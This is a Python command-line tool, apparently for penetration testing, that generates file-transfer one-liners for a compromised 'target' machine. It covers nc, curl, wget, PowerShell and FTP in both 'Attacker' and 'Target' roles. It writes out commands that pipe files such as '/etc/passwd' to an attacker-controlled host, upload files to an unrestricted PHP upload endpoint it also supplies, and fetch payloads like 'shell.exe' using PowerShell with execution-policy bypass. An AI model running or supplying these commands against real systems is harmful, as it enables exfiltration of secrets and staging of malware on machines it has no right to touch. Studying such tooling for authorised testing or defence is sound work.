#!/usr/bin/python3
import argparse
import argcomplete
import string
import random

COMMAND="\033[1;33;0m"
TEXT="\033[0;37;0m"
IMPORTANT="\033[0;32;0m"

def add_divider():
   return f'{TEXT}'+'-'*80 + '\n'

def add_option():
    data=add_divider()
    data+= ' '*39  + f'{TEXT}OR\n'
    data+=add_divider()
    return data

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def write_output(content, args):
    if args.output is not None:
        with open(args.output, 'w') as f:
            print(content, file=f)
            f.close()
    else:
        print (content)

def generate_php_file(args):
    uploadfilename=args.uploadfilename
    host=args.host
    port=args.port
    data=f'\n\n{TEXT}'+'='*80 + '\n'
    data+=' '*30+'Web Server upload PHP\n'
    data+=f'{TEXT} Please ensure the following upload functionality is enabled on your webserver\n'
    data+=f'{TEXT}'+'='*80 + '\n'
    data+=f'{IMPORTANT}cat << EOF > {uploadfilename}\n'
    data+='<?php\n'
    data+='  \\$uploaddir = \'/tmp/uploads/\';\n'
    data+='  \\$uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
    data+='  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile)\n'
    data+='?>\n'
    data+='EOF\n'
    data+=add_option()
    data+=f'{IMPORTANT}cat << EOF > {uploadfilename}\n'
    data+='<?php\n'
    data+='if (isset(\\$_FILES[\'file\'])){\n'
    data+='  $uploaddir = \'/tmp/uploads/\';\n'
    data+='  $uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
    data+='  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile);\n'
    data+='} else {\n'
    data+=f'  echo "<form action=\'/{uploadfilename}\' method=\'post\' enctype=\'multipart/form-data\'>";\n'
    data+='  echo "<input type=\'file\' name=\'file\'>";\n'
    data+='  echo "<input type=\'submit\' name=\'submit\'>";\n'
    data+='  echo "</form>";\n'
    data+='}\n'
    data+='?>\n'
    data+='EOF\n'
    data+=f'{TEXT}'+'='*80 + '\n'
    data+=' '*32 +f'{TEXT}Start a webserver\n'
    data+=f'{TEXT}'+'='*80 + '\n'
    data+=f'{COMMAND}sudo systemctl start apache2\n'
    data+=add_option()
    data+=f'{COMMAND}php -S {host}:{port}\n'
    data+=f'{TEXT}'+'='*80 + '\n\n'
    return data

def wrap_command(command):
    output=f'{TEXT}'+'='*80+'\n'
    output+=' '*19 + 'The command to run on the target server is\n'
    output+=f'{TEXT}'+'='*80+'\n\n'
    output+=command
    output+=f'\n{TEXT}'+'='*80+'\n'
    return output

def generate_nc(args):
    command=''
    filename=args.Filename
    host=args.host
    port=args.port
    destination=args.dest
    if args.action == 'put':
        command += f'{IMPORTANT}Attacker\n'
        command += add_divider()
        command += f'{COMMAND}nc -lvnp {port} > {destination}\n'
        command += add_divider()
        command += f'{IMPORTANT}Target\n'
        command += add_divider()
        command += f'{COMMAND}cat {filename} | nc {host} {port}\n'
    else:
        command += f'{IMPORTANT}Target\n'
        command += add_divider()
        command += f'{COMMAND}nc -lvnp {port} > {destination}\n'
        command += add_divider()
        command += f'{IMPORTANT}Attacker\n'
        command += add_divider()
        command += f'{COMMAND}cat {filename} | nc {host} {port}\n'
    write_output(wrap_command(command), args)

def generate_curl(args):
    path=args.path
    filename=args.Filename
    uploadfilename=args.uploadfilename
    host='http://'+args.host
    port=args.port
    destination=args.dest
    command=''
    if args.action == 'put':
        if args.target == 'windows':
            command+=f'{COMMAND}curl.exe -v -F filename={filename} -F file=@{filename} {host}:{port}{path}{uploadfilename}\n'
        else:
            command+=f'{COMMAND}curl -v -F filename={filename} -F file=@{filename} {host}:{port}{path}{uploadfilename}\n'
        command=wrap_command(command)+generate_php_file(args)

    else:
        if args.target == 'windows':
            command+=f'{COMMAND}curl.exe -L {host}:{port}{path}{filename} -o {destination}\n'
        else:
            command+=f'{COMMAND}curl -L {host}:{port}{path}{filename} -o {destination}\n'
        command=wrap_command(command)

    write_output(command, args)

def generate_wget(args):
    path=args.path
    filename=args.Filename
    host='http://'+args.host
    port=args.port
    destination=args.dest
    command=''
    if args.action == 'put':
        command="WGET Cannot currently reliably upload files, use an alternative\n"
        command=wrap_command(command)

    else:
        if args.target == 'windows':
            command+=f'{COMMAND}wget.exe {host}:{port}{path}{filename} -o {destination}\n'
        else:
            command+=f'{COMMAND}wget {host}:{port}{path}{filename} -o {destination}\n'
        command=wrap_command(command)
    write_output(command, args)

def generate_powershell(args):
    command=''
    path=args.path
    uploadfilename=args.uploadfilename
    filename=args.Filename
    host=args.host
    port=args.port
    destination=args.dest
    tmp_file=get_random_string(6)+'.ps1'

    if args.action == 'put':
        command=f'{COMMAND}powershell (New-Object System.Net.WebClient).UploadFile(\'http://{host}:{port}{path}{uploadfilename}\', \'{filename}\')\n'
        command=wrap_command(command) + generate_php_file(args)
    else:
        command=f'{COMMAND}powershell iwr -uri http://{host}:{port}{path}{filename} -out {destination}\n'
        command+=add_option()
        command+=f'{COMMAND}echo $webclient = New-Object System.Net.WebClient >>{tmp_file}\n'
        command+=f'echo $url = "http://{host}:{port}{path}{filename}" >>{tmp_file}\n'
        command+=f'echo $file = "{destination}" >>{tmp_file}\n'
        command+=f'echo $webclient.DownloadFile($url,$file) >>{tmp_file}\n'
        command+=f'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File {tmp_file}\n'
        command+=add_option()
        command+=f'{COMMAND}powershell.exe (New-Object System.Net.WebClient).DownloadFile(\'http://{host}:{port}{path}{filename}\', \'{destination}\')\n'
        command=wrap_command(command)


    write_output(command, args)

def generate_ftp(args):
    command=''
    host=args.host
    filename=args.Filename
    username=args.user
    password=args.password
    tmp_file=get_random_string(6)+'.tmp'
    action=args.action

    if args.target == 'windows':
        command=f'{COMMAND}echo \'OPEN {host}\' >> {tmp_file}\n'
        command+=f'echo \'USER {username}\' >> {tmp_file}\n'
        command+=f'echo \'{password}\' >> {tmp_file}\n'
        command+=f'echo \'{action} {filename}\' >> {tmp_file}\n'
        command+=f'echo \'bye\' >> {tmp_file}\n\n'
        command+=f'{IMPORTANT}ftp -in -s:{tmp_file}\n'
    else:
        command= f'{COMMAND}ftp {host} <<EOF\n'
        command+=f'USER {username} {password}\n'
        command+=f'{action} {filename}\n'
        command+='bye\n'
        command+='EOF\n'

    write_output(wrap_command(command), args)


parser = argparse.ArgumentParser(description='Generate scripted copy commands for Windows and Linux')
parser.add_argument('Filename', help='''The file you would like to transfer, relative to where you will be running the command.
                    Eg. '../../../etc/passwd', '/etc/passwd',  'http://<IP>/file' ''')

parser.add_argument('-d','--destination',dest='dest',  help='''The destination location relative to where the commands will be run.
                    Eg. '/tmp/shell', 'c:\\Windows\\System32\\Temp\\shell.exe' ''')

parser.add_argument('-t', '--target', dest='target', choices=['linux','windows'],
                    help='The target platform where the command will be run to transfer a file.',
                    default='windows', type=str.lower)

parser.add_argument('-m', '--method', dest='method', choices=['ftp', 'nc', 'powershell', 'vbscript', 'curl', 'wget'],
                    help='The method to use to transfer the data.',
                    default='ftp', type=str.lower)

parser.add_argument('-u', '--user', dest='user', help='The user to use with ftp or basic auth with php upload')
parser.add_argument('-p', '--password', dest='password', help='The password to use with ftp or basic auth with php upload')

parser.add_argument('-a', '--action', dest='action', choices=['put', 'get'], help='Upload or download', default='get', type=str.lower)

parser.add_argument('-o', '--output', dest='output', help='The filepath to write the output to')

parser.add_argument('--path', help='The path used in curl, wget put', default='/')
parser.add_argument('--uploadfilename', help='The alternate filename for upload.php (curl,wget put)', default='upload.php')
parser.add_argument('--host', dest='host', help='The hostname or ip of the host we are targeting. ftp,curl,wget,nc')
parser.add_argument('--port', dest='port', help='The portn of the host we are targeting. ftp,curl,wget,nc', default="80")
parser.add_argument('--https', help='HTTPS instead of the default http')

argcomplete.autocomplete(parser)
args = parser.parse_args()


if args.method == 'ftp':
    generate_ftp(args)
elif args.method == 'curl':
    generate_curl(args)
elif args.method == 'powershell':
    generate_powershell(args)
elif args.method == 'wget':
    generate_wget(args)
elif args.method == 'nc':
    generate_nc(args)
else:
    print (f'{IMPORTANT}The requested method has not been implemented yet')
